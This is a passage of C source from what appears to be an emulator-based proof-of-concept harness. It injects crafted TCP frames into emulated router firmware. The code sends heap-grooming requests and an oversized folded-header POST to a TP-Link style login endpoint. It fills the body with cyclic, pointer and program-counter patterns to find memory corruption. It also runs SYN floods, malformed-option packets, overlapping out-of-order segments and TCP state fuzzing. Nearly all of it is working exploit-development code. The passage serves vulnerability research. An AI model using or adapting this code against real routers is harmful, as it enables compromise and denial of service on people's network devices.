            getenv("LEOPARD_LONG_FOLD_FOLLOWUP"));
    leopard_tcp_tiny_mss_deliver(s, frame, len);
}

static void leopard_fe_start_tcp_tiny_mss(LeopardFEState *s,
                                          const uint8_t *buf, size_t size)
{
    const uint8_t *ip;
    const uint8_t *tcp;
    uint8_t ihl;
    uint8_t thl;
    uint16_t ip_len;
    uint16_t data_len;

    if (s->tcp_tiny_mss_started) {
        return;
    }
    if (size < 54 || buf[12] != 0x08 || buf[13] != 0x00 ||
        (buf[14] >> 4) != 4 || buf[23] != 6) {
        return;
    }
    ip = buf + 14;
    ihl = (ip[0] & 0x0f) * 4;
    if (ihl < 20 || size < 14 + ihl + 20) {
        return;
    }
    tcp = ip + ihl;
    thl = (tcp[12] >> 4) * 4;
    ip_len = leopard_get_be16(ip + 2);
    if (thl < 20 || ip_len < ihl + thl) {
        return;
    }
    data_len = ip_len - ihl - thl;
    if (leopard_get_be16(tcp + 2) != 80 || data_len == 0) {
        return;
    }
    leopard_fe_start_tcp_tiny_mss_now(s, "inbound TCP/80 data");
}

static void leopard_fe_maybe_start_tcp_tiny_mss_from_tx(LeopardFEState *s,
                                                        const uint8_t *frame,
                                                        size_t frame_len)
{
    const char *mode = getenv("LEOPARD_INJECT_TCP_TINY_MSS");
    const uint8_t *ip;
    const uint8_t *tcp;
    uint8_t ihl;
    uint8_t thl;
    uint16_t ip_len;

    if (s->tcp_tiny_mss_started || !mode || !*mode ||
        frame_len < 54 || frame[12] != 0x08 || frame[13] != 0x00 ||
        (frame[14] >> 4) != 4 || frame[23] != 6) {
        return;
    }
    ip = frame + 14;
    ihl = (ip[0] & 0x0f) * 4;
    if (ihl < 20 || frame_len < 14 + ihl + 20) {
        return;
    }
    tcp = ip + ihl;
    thl = (tcp[12] >> 4) * 4;
    ip_len = leopard_get_be16(ip + 2);
    if (thl < 20 || ip_len < ihl + thl ||
        leopard_get_be16(tcp + 0) != 80 ||
        (tcp[13] & 0x04)) {
        return;
    }
    if ((!strcmp(mode, "ooo-overlap") || !strcmp(mode, "long-fold") ||
         leopard_tcp_tiny_mss_long_fold_mode(mode) ||
         !strcmp(mode, "all")) &&
        (tcp[13] & 0x12) == 0x12) {
        fprintf(stderr,
                "[fe-poc] tiny-mss: saw firmware SYN-ACK trigger sport=%u "
                "dport=%u flags=%#x\n",
                leopard_get_be16(tcp + 0), leopard_get_be16(tcp + 2),
                tcp[13]);
        leopard_fe_start_tcp_tiny_mss_now(s, "firmware TCP/80 SYN-ACK");
        return;
    }
    if (ip_len == ihl + thl) {
        return;
    }
    leopard_fe_start_tcp_tiny_mss_now(s, "firmware TCP/80 payload");
}

static bool leopard_long_fold_body_word_byte(uint32_t body_pos, uint8_t *out)
{
    const char *words = getenv("LEOPARD_LONG_FOLD_BODY_WORDS");
    const char *p = words;

    while (p && *p) {
        char *end;
        unsigned long off;
        unsigned long val;

        while (*p == ',' || *p == ' ' || *p == '\t') {
            p++;
        }
        off = strtoul(p, &end, 0);
        if (end == p || *end != ':') {
            break;
        }
        p = end + 1;
        val = strtoul(p, &end, 0);
        if (end == p) {
            break;
        }
        if (body_pos >= off && body_pos < off + 4) {
            *out = (uint8_t)(val >> ((body_pos - off) * 8));
            return true;
        }
        p = end;
    }
    return false;
}

static void leopard_fe_send_long_fold(LeopardFEState *s, uint32_t ack,
                                      uint16_t win)
{
    uint8_t out[14 + 20 + 20 + 1500];
    size_t len;
    uint32_t allowed_end;
    int sent_now = 0;

    if (win > 0x4000) {
        win = 0x4000;
    }
    allowed_end = ack + win;

    while (s->tcp_long_fold_sent < s->tcp_long_fold_total &&
           (int32_t)(allowed_end -
                     (s->tcp_long_fold_base_seq +
                      s->tcp_long_fold_sent)) > 0 &&
           sent_now < 12) {
        char prefix[256];
        uint32_t line_len = leopard_long_fold_line_len();
        enum {
            CHUNK_MAX = 1400,
        };
        uint8_t payload[CHUNK_MAX];
        uint32_t off = s->tcp_long_fold_sent;
        uint32_t curseq = s->tcp_long_fold_base_seq + off;
        uint32_t room = allowed_end - curseq;
        size_t chunk = s->tcp_long_fold_total - off;
        int prefix_n = snprintf(prefix, sizeof(prefix),
                                "POST /data/login.json?code=3&asyn=0&id=x HTTP/1.1\r\n"
                                "Host: tplinkwifi.net\r\n"
                                "Content-Type: application/json\r\n"
                                "Content-Length: %u\r\n"
                                "Connection: close\r\n"
                                "X-Fold: ",
                                leopard_long_fold_content_length());
        size_t prefix_len = prefix_n > 0 ? (size_t)prefix_n : 0;

        if (prefix_len >= sizeof(prefix)) {
            prefix_len = sizeof(prefix) - 1;
        }

        if (chunk > room) {
            chunk = room;
        }
        if (chunk > sizeof(payload)) {
            chunk = sizeof(payload);
        }
        for (size_t i = 0; i < chunk; i++) {
            uint32_t pos = off + (uint32_t)i;
            if (pos < prefix_len) {
                payload[i] = (uint8_t)prefix[pos];
            } else if (pos < prefix_len + line_len) {
                payload[i] = 'A';
            } else if (pos < prefix_len + line_len + 4) {
                static const uint8_t crlfs[4] = {'\r', '\n', '\r', '\n'};
                payload[i] = crlfs[pos - prefix_len - line_len];
            } else {
                const char *body_pattern = getenv("LEOPARD_LONG_FOLD_BODY_PATTERN");
                uint32_t body_pos = pos - (uint32_t)(prefix_len + line_len + 4);
                uint8_t word_byte;

                if (leopard_long_fold_body_word_byte(body_pos, &word_byte)) {
                    payload[i] = word_byte;
                } else if (body_pattern && !strcmp(body_pattern, "preserve-cap-sentinel") &&
                    body_pos >= 0x468 && body_pos < 0x46c) {
                    static const uint8_t sentinel[4] = {0xc7, 0xa0, 0xe2, 0xf4};
                    payload[i] = sentinel[body_pos - 0x468];
                } else if (body_pattern && !strcmp(body_pattern, "preserve-sentinel") &&
                    body_pos < 4) {
                    static const uint8_t sentinel[4] = {0xc7, 0xa0, 0xe2, 0xf4};
                    payload[i] = sentinel[body_pos];
                } else if (body_pattern && !strcmp(body_pattern, "cyclic")) {
                    static const char cyclic[] =
                        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                    payload[i] = cyclic[body_pos % (sizeof(cyclic) - 1)];
                } else if (body_pattern && !strcmp(body_pattern, "offset32")) {
                    uint32_t word_pos = body_pos & ~3u;
                    payload[i] = (uint8_t)(word_pos >> ((body_pos & 3u) * 8));
                } else if (body_pattern && !strcmp(body_pattern, "ptr-offset32")) {
                    uint32_t word_pos = 0x41000000u | (body_pos & ~3u);
                    payload[i] = (uint8_t)(word_pos >> ((body_pos & 3u) * 8));
                } else if (body_pattern && !strcmp(body_pattern, "pc-pattern")) {
                    uint32_t word_pos = 0x40400000u | (body_pos & 0x000ffffcu);
                    payload[i] = (uint8_t)(word_pos >> ((body_pos & 3u) * 8));
                } else if (body_pattern && !strcmp(body_pattern, "preserve-sentinel")) {
                    payload[i] = 'C';
                } else {
                    payload[i] = 'B';
                }
            }
        }

        len = leopard_build_tcp_client_probe(
            s, out, 40100, 0x18, curseq, s->tcp_tiny_mss_server_ack,
            0x4000, 0, NULL, 0, payload, chunk);
        if (s->tcp_long_fold_sent == 0 ||
            ((s->tcp_long_fold_sent + chunk) >> 16) !=
            (s->tcp_long_fold_sent >> 16) ||
            s->tcp_long_fold_sent + chunk == s->tcp_long_fold_total) {
            fprintf(stderr,
                    "[fe-poc] long-fold: send off=%u chunk=%zu "
                    "seq=%#x ack=%#x total=%u len=%zu\n",
                    off, chunk, curseq, s->tcp_tiny_mss_server_ack,
                    s->tcp_long_fold_total, len);
        }
        leopard_tcp_tiny_mss_deliver(s, out, len);
        s->tcp_long_fold_sent += chunk;
        s->tcp_tiny_mss_client_seq = s->tcp_long_fold_base_seq +
                                     s->tcp_long_fold_sent;
        if (getenv("LEOPARD_LONG_FOLD_FOLLOWUP") &&
            !s->tcp_long_fold_followup_started) {
            uint32_t followup_at = (uint32_t)prefix_len + line_len + 4 + 0x1468;
            const char *followup_at_env =
                getenv("LEOPARD_LONG_FOLD_FOLLOWUP_AT");

            if (followup_at_env && *followup_at_env) {
                followup_at = strtoul(followup_at_env, NULL, 0);
            }
            if (s->tcp_long_fold_sent >= followup_at) {
                leopard_fe_start_long_fold_followup(s);
            }
        }
        sent_now++;
    }
    if (s->tcp_long_fold_sent >= s->tcp_long_fold_total) {
        leopard_fe_start_long_fold_followup(s);
    }
}

static void leopard_fe_maybe_continue_tcp_tiny_mss(LeopardFEState *s,
                                                   const uint8_t *frame,
                                                   size_t frame_len)
{
    const char *mode = getenv("LEOPARD_INJECT_TCP_TINY_MSS");
    const uint8_t *ip;
    const uint8_t *tcp;
    uint8_t ihl;
    uint8_t thl;
    uint16_t ip_len;
    uint16_t data_len;
    uint8_t out[14 + 20 + 20 + 1500];
    size_t len;

    if (!mode || !*mode ||
        frame_len < 54 || frame[12] != 0x08 || frame[13] != 0x00 ||
        (frame[14] >> 4) != 4 || frame[23] != 6) {
        return;
    }
    ip = frame + 14;
    ihl = (ip[0] & 0x0f) * 4;
    ip_len = leopard_get_be16(ip + 2);
    if (ip_len > frame_len - 14) {
        ip_len = frame_len - 14;
    }
    if (ihl < 20 || ip_len < ihl + 20 || frame_len < 14 + ihl + 20) {
        return;
    }
    tcp = ip + ihl;
    thl = (tcp[12] >> 4) * 4;
    if (thl < 20 || ip_len < ihl + thl || frame_len < 14 + ihl + thl) {
        return;
    }
    data_len = ip_len - ihl - thl;
    if (leopard_get_be16(tcp + 0) != 80) {
        return;
    }
    if (leopard_get_be16(tcp + 2) == 40099 &&
        s->tcp_long_fold_pregroom_started) {
        uint8_t payload[768];
        uint32_t seq = leopard_get_be32(tcp + 4);
        uint32_t ack = seq + data_len + ((tcp[13] & 0x03) ? 1 : 0);

        if (!s->tcp_long_fold_pregroom_established &&
            (tcp[13] & 0x12) == 0x12) {
            size_t payload_len;

            s->tcp_long_fold_pregroom_established = true;
            s->tcp_long_fold_pregroom_server_seq = seq;
            s->tcp_long_fold_pregroom_server_ack = seq + 1;
            s->tcp_long_fold_pregroom_client_seq++;
            len = leopard_build_tcp_client_probe(
                s, out, 40099, 0x10,
                s->tcp_long_fold_pregroom_client_seq,
                s->tcp_long_fold_pregroom_server_ack, 0x4000, 0,
                NULL, 0, NULL, 0);
            fprintf(stderr,
                    "[fe-poc] long-fold pregroom: ACK SYN-ACK seq=%#x "
                    "ack=%#x len=%zu\n",
                    s->tcp_long_fold_pregroom_client_seq,
                    s->tcp_long_fold_pregroom_server_ack, len);
            leopard_tcp_tiny_mss_deliver(s, out, len);

            payload_len = leopard_build_long_fold_pregroom_request(
                payload, sizeof(payload));
            if (payload_len) {
                len = leopard_build_tcp_client_probe(
                    s, out, 40099, 0x18,
                    s->tcp_long_fold_pregroom_client_seq,
                    s->tcp_long_fold_pregroom_server_ack, 0x4000, 0,
                    NULL, 0, payload, payload_len);
                fprintf(stderr,
                        "[fe-poc] long-fold pregroom: POST payload=%zu "
                        "seq=%#x ack=%#x len=%zu\n",
                        payload_len,
                        s->tcp_long_fold_pregroom_client_seq,
                        s->tcp_long_fold_pregroom_server_ack, len);
                leopard_tcp_tiny_mss_deliver(s, out, len);
                s->tcp_long_fold_pregroom_client_seq += payload_len;
                s->tcp_long_fold_pregroom_sent = true;
            }
            return;
        }

        if (s->tcp_long_fold_pregroom_established &&
            (data_len || (tcp[13] & 0x01))) {
            len = leopard_build_tcp_client_probe(
                s, out, 40099, 0x10,
                s->tcp_long_fold_pregroom_client_seq, ack,
                0x4000, 0, NULL, 0, NULL, 0);
            fprintf(stderr,
                    "[fe-poc] long-fold pregroom: ACK server data=%u "
                    "flags=%#x ack=%#x len=%zu\n",
                    data_len, tcp[13], ack, len);
            leopard_tcp_tiny_mss_deliver(s, out, len);
            if (s->tcp_long_fold_pregroom_sent &&
                (data_len || (tcp[13] & 0x01))) {
                s->tcp_long_fold_pregroom_complete = true;
                fprintf(stderr,
                        "[fe-poc] long-fold pregroom: complete, starting "
                        "long-fold connection\n");
                leopard_fe_start_tcp_tiny_mss_now(s, "pregroom complete");
            }
        }
        return;
    }
    if (leopard_get_be16(tcp + 2) == 40101 &&
        s->tcp_long_fold_followup_started) {
        uint8_t payload[768];
        uint32_t seq = leopard_get_be32(tcp + 4);
        uint32_t ack = seq + data_len + ((tcp[13] & 0x03) ? 1 : 0);

        if (!s->tcp_long_fold_followup_established &&
            (tcp[13] & 0x12) == 0x12) {
            size_t payload_len;

            s->tcp_long_fold_followup_established = true;
            s->tcp_long_fold_followup_server_seq = seq;
            s->tcp_long_fold_followup_server_ack = seq + 1;
            s->tcp_long_fold_followup_client_seq++;
            len = leopard_build_tcp_client_probe(
                s, out, 40101, 0x10,
                s->tcp_long_fold_followup_client_seq,
                s->tcp_long_fold_followup_server_ack, 0x4000, 0,
                NULL, 0, NULL, 0);
            fprintf(stderr,
                    "[fe-poc] long-fold followup: ACK SYN-ACK seq=%#x "
                    "ack=%#x len=%zu\n",
                    s->tcp_long_fold_followup_client_seq,
                    s->tcp_long_fold_followup_server_ack, len);
            leopard_tcp_tiny_mss_deliver(s, out, len);

            payload_len = leopard_build_long_fold_followup_request(
                payload, sizeof(payload));
            if (payload_len) {
                len = leopard_build_tcp_client_probe(
                    s, out, 40101, 0x18,
                    s->tcp_long_fold_followup_client_seq,
                    s->tcp_long_fold_followup_server_ack, 0x4000, 0,
                    NULL, 0, payload, payload_len);
                fprintf(stderr,
                        "[fe-poc] long-fold followup: POST payload=%zu "
                        "seq=%#x ack=%#x len=%zu\n",
                        payload_len,
                        s->tcp_long_fold_followup_client_seq,
                        s->tcp_long_fold_followup_server_ack, len);
                leopard_tcp_tiny_mss_deliver(s, out, len);
                s->tcp_long_fold_followup_client_seq += payload_len;
                s->tcp_long_fold_followup_sent = true;
            }
            return;
        }

        if (s->tcp_long_fold_followup_established &&
            (data_len || (tcp[13] & 0x01))) {
            len = leopard_build_tcp_client_probe(
                s, out, 40101, 0x10,
                s->tcp_long_fold_followup_client_seq, ack,
                0x4000, 0, NULL, 0, NULL, 0);
            fprintf(stderr,
                    "[fe-poc] long-fold followup: ACK server data=%u "
                    "flags=%#x ack=%#x len=%zu\n",
                    data_len, tcp[13], ack, len);
            leopard_tcp_tiny_mss_deliver(s, out, len);
        }
        return;
    }
    if (leopard_get_be16(tcp + 2) != 40100) {
        return;
    }

    if (s->tcp_tiny_mss_established) {
        if (leopard_tcp_tiny_mss_long_fold_mode(mode)) {
            uint32_t ack = leopard_get_be32(tcp + 8);
            uint16_t win = leopard_get_be16(tcp + 14);
            leopard_fe_send_long_fold(s, ack, win);
            return;
        }
        if (!strcmp(mode, "ts-ackdata")) {
            uint32_t seq = leopard_get_be32(tcp + 4);
            uint32_t ack = seq + data_len + ((tcp[13] & 0x01) ? 1 : 0);
            if (data_len != 0 || (tcp[13] & 0x01)) {
                uint8_t tsopt[12] = {
                    1, 1, 8, 10,
                    0x7f, 0xff, 0xff, 0xff,
                    0x7f, 0xff, 0xff, 0xff,
                };
                if ((int32_t)(ack - s->tcp_tiny_mss_server_ack) > 0) {
                    s->tcp_tiny_mss_server_ack = ack;
                    len = leopard_build_tcp_client_probe(s, out, 40100, 0x10,
                                                         s->tcp_tiny_mss_client_seq,
                                                         ack, 0x4000, 0,
                                                         tsopt, sizeof(tsopt),
                                                         NULL, 0);
                    fprintf(stderr,
                            "[fe-poc] tiny-mss ts-ackdata: ACK server "
                            "seq=%#x payload=%u flags=%#x ack=%#x len=%zu\n",
                            seq, data_len, tcp[13], ack, len);
                    leopard_fe_deliver_rx_frame(s, out, len, true);
                }
            }
        }
        return;
    }

    if ((tcp[13] & 0x12) != 0x12) {
        return;
    }

    s->tcp_tiny_mss_established = true;
    s->tcp_tiny_mss_server_seq = leopard_get_be32(tcp + 4);
    s->tcp_tiny_mss_server_ack = s->tcp_tiny_mss_server_seq + 1;
    s->tcp_tiny_mss_client_seq++;
    if (leopard_tcp_tiny_mss_long_fold_mode(mode)) {
        char prefix[256];
        int prefix_n = snprintf(prefix, sizeof(prefix),
                                "POST /data/login.json?code=3&asyn=0&id=x HTTP/1.1\r\n"
                                "Host: tplinkwifi.net\r\n"
                                "Content-Type: application/json\r\n"
                                "Content-Length: %u\r\n"
                                "Connection: close\r\n"
                                "X-Fold: ",
                                leopard_long_fold_content_length());
        size_t prefix_len = prefix_n > 0 ? (size_t)prefix_n : 0;

        if (prefix_len >= sizeof(prefix)) {
            prefix_len = sizeof(prefix) - 1;
        }
        s->tcp_long_fold_base_seq = s->tcp_tiny_mss_client_seq;
        s->tcp_long_fold_sent = 0;
        s->tcp_long_fold_total = prefix_len + leopard_long_fold_line_len() +
                                 4 + leopard_long_fold_body_prefix_len();
    }

    if (!strcmp(mode, "ts-future") || !strcmp(mode, "ts-ackdata")) {
        uint8_t tsopt[12] = {
            1, 1, 8, 10,
            0x7f, 0xff, 0xff, 0xff,
            0x7f, 0xff, 0xff, 0xff,
        };
        len = leopard_build_tcp_client_probe(s, out, 40100, 0x10,
                                             s->tcp_tiny_mss_client_seq,
                                             s->tcp_tiny_mss_server_seq + 1,
                                             0x4000, 0, tsopt, sizeof(tsopt),
                                             NULL, 0);
    } else {
        len = leopard_build_tcp_client_probe(s, out, 40100, 0x10,
                                             s->tcp_tiny_mss_client_seq,
                                             s->tcp_tiny_mss_server_seq + 1,
                                             0x4000, 0, NULL, 0, NULL, 0);
    }
    fprintf(stderr,
            "[fe-poc] tiny-mss: injecting ACK seq=%#x ack=%#x len=%zu\n",
            s->tcp_tiny_mss_client_seq, s->tcp_tiny_mss_server_seq + 1, len);
    leopard_tcp_tiny_mss_deliver(s, out, len);

    if (leopard_tcp_tiny_mss_long_fold_mode(mode)) {
        fprintf(stderr,
                "[fe-poc] long-fold: established base_seq=%#x total=%u\n",
                s->tcp_long_fold_base_seq, s->tcp_long_fold_total);
        leopard_fe_send_long_fold(s, leopard_get_be32(tcp + 8),
                                  leopard_get_be16(tcp + 14));
        return;
    }

    if (!strcmp(mode, "ts-future") || !strcmp(mode, "ts-ackdata")) {
        static const uint8_t req[] =
            "GET / HTTP/1.1\r\nHost: tplinkwifi.net\r\nConnection: close\r\n\r\n";
        uint8_t tsopt[12] = {
            1, 1, 8, 10,
            0x7f, 0xff, 0xff, 0xff,
            0x7f, 0xff, 0xff, 0xff,
        };
        len = leopard_build_tcp_client_probe(s, out, 40100, 0x18,
                                             s->tcp_tiny_mss_client_seq,
                                             s->tcp_tiny_mss_server_ack,
                                             0x4000, 0, tsopt, sizeof(tsopt),
                                             req, sizeof(req) - 1);
        fprintf(stderr,
                "[fe-poc] tiny-mss %s: injecting timestamped GET "
                "payload=%zu ack=%#x len=%zu\n",
                mode, sizeof(req) - 1, s->tcp_tiny_mss_server_ack, len);
        leopard_fe_deliver_rx_frame(s, out, len, true);
        s->tcp_tiny_mss_client_seq += sizeof(req) - 1;
        return;
    }

    if (!strcmp(mode, "ooo-overlap")) {
        static const uint8_t req[] =
            "GET / HTTP/1.1\r\nHost: tplinkwifi.net\r\nConnection: close\r\n\r\n";
        uint8_t a[80], b[120], c[20], d[32], filler[192];
        uint32_t seq = s->tcp_tiny_mss_client_seq;
        uint32_t ack = s->tcp_tiny_mss_server_seq + 1;
        size_t req_len = sizeof(req) - 1;

        memset(a, 'A', sizeof(a));
        memset(b, 'B', sizeof(b));
        memset(c, 'C', sizeof(c));
        memset(d, 'D', sizeof(d));
        memset(filler, 'F', sizeof(filler));

        len = leopard_build_tcp_client_probe(s, out, 40100, 0x18,
                                             seq + 200, ack, 0x4000, 0,
                                             NULL, 0, a, sizeof(a));
        fprintf(stderr,
                "[fe-poc] tiny-mss OOO: segment A len=%zu seq=%#x\n",
                len, seq + 200);
        leopard_fe_deliver_rx_frame(s, out, len, true);

        len = leopard_build_tcp_client_probe(s, out, 40100, 0x18,
                                             seq + 160, ack, 0x4000, 0,
                                             NULL, 0, b, sizeof(b));
        fprintf(stderr,
                "[fe-poc] tiny-mss OOO: overlap B len=%zu seq=%#x\n",
                len, seq + 160);
        leopard_fe_deliver_rx_frame(s, out, len, true);

        len = leopard_build_tcp_client_probe(s, out, 40100, 0x18,
                                             seq + 180, ack, 0x4000, 0,
                                             NULL, 0, c, sizeof(c));
        fprintf(stderr,
                "[fe-poc] tiny-mss OOO: covered C len=%zu seq=%#x\n",
                len, seq + 180);
        leopard_fe_deliver_rx_frame(s, out, len, true);

        len = leopard_build_tcp_client_probe(s, out, 40100, 0x18,
                                             seq + 280, ack, 0x4000, 0,
                                             NULL, 0, d, sizeof(d));
        fprintf(stderr,
                "[fe-poc] tiny-mss OOO: coalesce D len=%zu seq=%#x\n",
                len, seq + 280);
        leopard_fe_deliver_rx_frame(s, out, len, true);

        if (req_len < 160) {
            size_t gap_len = 160 - req_len;
            len = leopard_build_tcp_client_probe(s, out, 40100, 0x18,
                                                 seq + req_len, ack, 0x4000, 0,
                                                 NULL, 0, filler, gap_len);
            fprintf(stderr,
                    "[fe-poc] tiny-mss OOO: filler len=%zu seq=%#x gap=%zu\n",
                    len, seq + (uint32_t)req_len, gap_len);
            leopard_fe_deliver_rx_frame(s, out, len, true);
        }

        len = leopard_build_tcp_client_probe(s, out, 40100, 0x18,
                                             seq, ack, 0x4000, 0, NULL, 0,
                                             req, req_len);
        fprintf(stderr,
                "[fe-poc] tiny-mss OOO: in-order GET payload=%zu len=%zu\n",
                req_len, len);
        leopard_fe_deliver_rx_frame(s, out, len, true);
        s->tcp_tiny_mss_client_seq += 312;
        return;
    }

    if (!strcmp(mode, "get") || !strcmp(mode, "all")) {
        static const uint8_t req[] =
            "GET / HTTP/1.1\r\nHost: tplinkwifi.net\r\nConnection: close\r\n\r\n";
        len = leopard_build_tcp_client_probe(s, out, 40100, 0x18,
                                             s->tcp_tiny_mss_client_seq,
                                             s->tcp_tiny_mss_server_seq + 1,
                                             0x4000, 0, NULL, 0,
                                             req, sizeof(req) - 1);
        fprintf(stderr,
                "[fe-poc] tiny-mss: injecting HTTP GET payload=%zu len=%zu\n",
                sizeof(req) - 1, len);
        leopard_fe_deliver_rx_frame(s, out, len, true);
        s->tcp_tiny_mss_client_seq += sizeof(req) - 1;
    }
}

static void leopard_fe_maybe_inject_bad_tcp(LeopardFEState *s)
{
    const char *mode = getenv("LEOPARD_INJECT_BAD_TCP");
    uint8_t frame[14 + 20 + 60 + 32];
    size_t len;

    if (s->bad_tcp_injected || !mode || !*mode) {
        return;
    }
    if (!(s->glo_cfg & 4) || !s->rx_base || !s->rx_max) {
        return;
    }

    s->bad_tcp_injected = true;
    leopard_fe_ensure_ipv4_binding();

    if (!strcmp(mode, "syn-flood") || !strcmp(mode, "syn-flood-heavy")) {
        uint16_t syn_flood_count =
            !strcmp(mode, "syn-flood-heavy") ? 4096 : 768;

        for (uint16_t i = 0; i < syn_flood_count; i++) {
            uint16_t sport = 41000 + i;
            uint32_t src_ip = 0xc0a80002u + ((uint32_t)(i >> 8) << 8) +
                              (i & 0xff);
            len = leopard_build_tcp_syn_probe(s, frame, sport,
                                              0x02000000u + i * 0x1000u,
                                              0x6100 + i, src_ip);
            if ((i & 0x1f) == 0) {
                fprintf(stderr,
                        "[fe-poc] injecting TCP SYN flood %u/%u sport=%u "
                        "src=%u.%u.%u.%u len=%zu\n",
                        i + 1, syn_flood_count, sport,
                        (src_ip >> 24) & 0xff, (src_ip >> 16) & 0xff,
                        (src_ip >> 8) & 0xff, src_ip & 0xff, len);
            }
            leopard_fe_deliver_rx_frame(s, frame, len, true);
        }
        return;
    }

    if (!strcmp(mode, "short-thl") || !strcmp(mode, "all")) {
        uint8_t opts[40];
        memset(opts, 1, sizeof(opts));
        len = leopard_build_tcp_probe(s, frame, 40000, 0x02, opts,
                                      sizeof(opts), NULL, 0);
        /* Lie: advertise a 60-byte TCP header but deliver only 20 bytes. */
        leopard_put_be16(frame + 14 + 2, 40);
        leopard_fix_ipv4_checksums(frame + 14, 40);
        fprintf(stderr, "[fe-poc] injecting bad TCP short-thl len=54 iplen=40\n");
        leopard_fe_deliver_rx_frame(s, frame, 54, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "bad-optlen") || !strcmp(mode, "all")) {
        uint8_t opts[20] = {
            2, 1, 0x05, 0xb4,  /* malformed MSS length */
            3, 2,              /* malformed window-scale length */
            8, 3, 0,           /* malformed timestamp length */
            4, 2,              /* SACK-permitted */
            1, 1, 1, 1, 1, 1, 1, 1, 1
        };
        len = leopard_build_tcp_probe(s, frame, 40001, 0x02, opts,
                                      sizeof(opts), NULL, 0);
        fprintf(stderr, "[fe-poc] injecting bad TCP option lengths len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "syn-fin") || !strcmp(mode, "all")) {
        len = leopard_build_tcp_probe(s, frame, 40002, 0x03, NULL, 0, NULL, 0);
        fprintf(stderr, "[fe-poc] injecting bad TCP SYN+FIN len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "urg-syn") || !strcmp(mode, "all")) {
        uint8_t payload[8] = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48 };
        len = leopard_build_tcp_probe(s, frame, 40003, 0x22, NULL, 0,
                                      payload, sizeof(payload));
        leopard_put_be16(frame + 14 + 20 + 18, 0xffff);
        leopard_fix_ipv4_checksums(frame + 14, len - 14);
        fprintf(stderr, "[fe-poc] injecting bad TCP SYN+URG ptr=65535 len=%zu\n", len);
        leopard_fe_deliver_rx_frame(s, frame, len, true);
    }
}

static void leopard_fe_maybe_inject_tcp_est(LeopardFEState *s,
                                            const uint8_t *buf, size_t size)
{
    const char *mode = getenv("LEOPARD_INJECT_TCP_EST");
    const uint8_t *ip;
    const uint8_t *tcp;
    uint8_t ihl;
    uint8_t thl;
    uint16_t ip_len;
    uint16_t data_len;
    uint8_t frame[14 + 20 + 20 + 192];
    size_t len;

    if (s->tcp_est_injected || !mode || !*mode) {
        return;
    }
    if (size < 54 || buf[12] != 0x08 || buf[13] != 0x00 ||
        (buf[14] >> 4) != 4 || buf[23] != 6) {
        return;
    }

    ip = buf + 14;
    ihl = (ip[0] & 0x0f) * 4;
    if (ihl < 20 || size < 14 + ihl + 20) {
        return;
    }
    tcp = ip + ihl;
    thl = (tcp[12] >> 4) * 4;
    ip_len = leopard_get_be16(ip + 2);
    if (thl < 20 || ip_len < ihl + thl ||
        size < 14 + ihl + thl) {
        return;
    }
    data_len = ip_len - ihl - thl;
    if (leopard_get_be16(tcp + 2) != 80 || data_len == 0) {
        return;
    }

    s->tcp_est_injected = true;

    if (!strcmp(mode, "urg-hole") || !strcmp(mode, "all")) {
        uint8_t payload[8] = { 'U', 'R', 'G', 'H', 'O', 'L', 'E', '\n' };
        len = leopard_build_tcp_est_probe(s, frame, ip, 0x30,
                                          leopard_get_be32(tcp + 4),
                                          leopard_get_be32(tcp + 8),
                                          leopard_get_be16(tcp + 14),
                                          0x4000, payload, sizeof(payload));
        fprintf(stderr,
                "[fe-poc] injecting established TCP URG hole len=%zu "
                "seq=%#x ack=%#x urg=0x4000\n",
                len, leopard_get_be32(tcp + 4), leopard_get_be32(tcp + 8));
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "ts-future") || !strcmp(mode, "all")) {
        uint8_t tsopt[12] = {
            1, 1, 8, 10,
            0x7f, 0xff, 0xff, 0xff,
            0x7f, 0xff, 0xff, 0xff,
        };
        len = leopard_build_tcp_est_probe_opts(s, frame, ip, 0x10,
                                               leopard_get_be32(tcp + 4),
                                               leopard_get_be32(tcp + 8),
                                               leopard_get_be16(tcp + 14),
                                               0, tsopt, sizeof(tsopt),
                                               NULL, 0);
        fprintf(stderr,
                "[fe-poc] injecting established TCP future TS echo len=%zu "
                "seq=%#x ack=%#x tsval=0x7fffffff tsecr=0x7fffffff\n",
                len, leopard_get_be32(tcp + 4), leopard_get_be32(tcp + 8));
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "zero-window") || !strcmp(mode, "all")) {
        len = leopard_build_tcp_est_probe(s, frame, ip, 0x10,
                                          leopard_get_be32(tcp + 4),
                                          leopard_get_be32(tcp + 8),
                                          0, 0, NULL, 0);
        fprintf(stderr,
                "[fe-poc] injecting established TCP zero-window ACK len=%zu "
                "seq=%#x ack=%#x\n",
                len, leopard_get_be32(tcp + 4), leopard_get_be32(tcp + 8));
        leopard_fe_deliver_rx_frame(s, frame, len, true);
        if (strcmp(mode, "all")) {
            return;
        }
    }

    if (!strcmp(mode, "state-fuzz") || !strcmp(mode, "all")) {
        uint32_t seq = leopard_get_be32(tcp + 4);
        uint32_t ack = leopard_get_be32(tcp + 8);
        uint16_t win = leopard_get_be16(tcp + 14);

        len = leopard_build_tcp_est_probe(s, frame, ip, 0x14, seq + 0x40000000,
                                          ack, win, 0, NULL, 0);
        fprintf(stderr,
                "[fe-poc] injecting TCP state-fuzz far RST len=%zu "
                "seq=%#x ack=%#x\n",
                len, seq + 0x40000000, ack);
        leopard_fe_deliver_rx_frame(s, frame, len, true);

        len = leopard_build_tcp_est_probe(s, frame, ip, 0x11, seq - 64,
                                          ack, win, 0, NULL, 0);
        fprintf(stderr,
                "[fe-poc] injecting TCP state-fuzz old FIN len=%zu "
                "seq=%#x ack=%#x\n",
                len, seq - 64, ack);
        leopard_fe_deliver_rx_frame(s, frame, len, true);

        len = leopard_build_tcp_est_probe(s, frame, ip, 0x10, seq,
                                          ack + 0x40000000, win, 0, NULL, 0);
        fprintf(stderr,
                "[fe-poc] injecting TCP state-fuzz future ACK len=%zu "
                "seq=%#x ack=%#x\n",
